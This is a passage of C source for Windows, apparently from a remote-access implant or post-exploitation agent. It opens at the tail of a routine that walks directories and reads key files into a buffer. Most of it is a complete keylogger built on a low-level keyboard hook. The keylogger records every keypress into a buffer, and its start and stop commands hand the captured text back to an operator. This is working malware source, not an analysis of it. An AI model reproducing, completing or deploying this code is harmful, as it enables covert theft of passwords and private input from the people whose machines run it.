                    if (offset < buf_size - 1) buf[offset++] = '\n';
                }
                if (key_data) HeapFree(GetProcessHeap(), 0, key_data);
                if (offset >= buf_size - 4096) break;
            } while (FindNextFileA(hKeyFind, &kfd));
            FindClose(hKeyFind);
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }

    *output = buf;
    *output_size = offset;
    return offset > 0;
}

/* ---- Keylogger (low-level keyboard hook) ---- */

static HHOOK g_keylog_hook = NULL;
static char g_keylog_buffer[65536] = {0};
static int g_keylog_pos = 0;
static CRITICAL_SECTION g_keylog_cs;
static volatile BOOL g_keylog_active = FALSE;
static volatile BOOL g_keylog_cs_inited = FALSE;
static HANDLE g_keylog_thread = NULL;

static LRESULT CALLBACK keylog_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        BYTE keyState[256] = {0};
        GetKeyboardState(keyState);

        WCHAR unicodeChar[4] = {0};
        int ulen = ToUnicode(kb->vkCode, kb->scanCode, keyState, unicodeChar, 4, 0);

        if (ulen > 0 && g_keylog_cs_inited) {
            EnterCriticalSection(&g_keylog_cs);
            char mb[8] = {0};
            int mbLen = WideCharToMultiByte(CP_UTF8, 0, unicodeChar, ulen, mb, sizeof(mb), NULL, NULL);
            if (mbLen > 0 && g_keylog_pos + mbLen < (int)sizeof(g_keylog_buffer)) {
                CopyMemory(g_keylog_buffer + g_keylog_pos, mb, mbLen);
                g_keylog_pos += mbLen;
            }
            LeaveCriticalSection(&g_keylog_cs);
        }
    }
    return CallNextHookEx(g_keylog_hook, nCode, wParam, lParam);
}

static DWORD WINAPI keylog_msg_thread(LPVOID param) {
    (void)param;
    MSG msg;
    while (g_keylog_active && GetMessageA(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    return 0;
}

BOOL cred_keylog_start(char *out, int out_size) {
    if (g_keylog_active) {
        if (out && out_size > 0)
            _snprintf(out, out_size, "Keylogger already running");
        return TRUE;
    }

    if (!g_keylog_cs_inited) {
        InitializeCriticalSection(&g_keylog_cs);
        g_keylog_cs_inited = TRUE;
    }

    g_keylog_pos = 0;
    g_keylog_active = TRUE;

    g_keylog_hook = SetWindowsHookExA(WH_KEYBOARD_LL, keylog_hook_proc,
                                      GetModuleHandleA(NULL), 0);
    if (!g_keylog_hook) {
        g_keylog_active = FALSE;
        if (out && out_size > 0)
            _snprintf(out, out_size, "SetWindowsHookEx failed: %lu", GetLastError());
        return FALSE;
    }

    g_keylog_thread = jager_create_thread(NULL, 0, keylog_msg_thread, NULL, 0, NULL);
    if (!g_keylog_thread) {
        UnhookWindowsHookEx(g_keylog_hook);
        g_keylog_hook = NULL;
        g_keylog_active = FALSE;
        if (out && out_size > 0)
            _snprintf(out, out_size, "keylog message thread failed");
        return FALSE;
    }

    if (out && out_size > 0)
        _snprintf(out, out_size, "Keylogger started");
    return TRUE;
}

BOOL cred_keylog_stop(char *out, int out_size) {
    if (!g_keylog_active) {
        if (out && out_size > 0)
            _snprintf(out, out_size, "Keylogger not running");
        return TRUE;
    }

    g_keylog_active = FALSE;
    if (g_keylog_thread) {
        PostThreadMessageA(GetThreadId(g_keylog_thread), WM_QUIT, 0, 0);
        WaitForSingleObject(g_keylog_thread, 5000);
        CloseHandle(g_keylog_thread);
        g_keylog_thread = NULL;
    }

    if (g_keylog_hook) {
        UnhookWindowsHookEx(g_keylog_hook);
        g_keylog_hook = NULL;
    }

    if (g_keylog_cs_inited) {
        EnterCriticalSection(&g_keylog_cs);
        if (out && out_size > 0) {
            if (g_keylog_pos > 0)
                _snprintf(out, out_size, "Captured %d bytes:\n%.*s",
                          g_keylog_pos, g_keylog_pos, g_keylog_buffer);
            else
                _snprintf(out, out_size, "No keystrokes captured");
        }
        g_keylog_pos = 0;
        LeaveCriticalSection(&g_keylog_cs);
    }
    return TRUE;
}
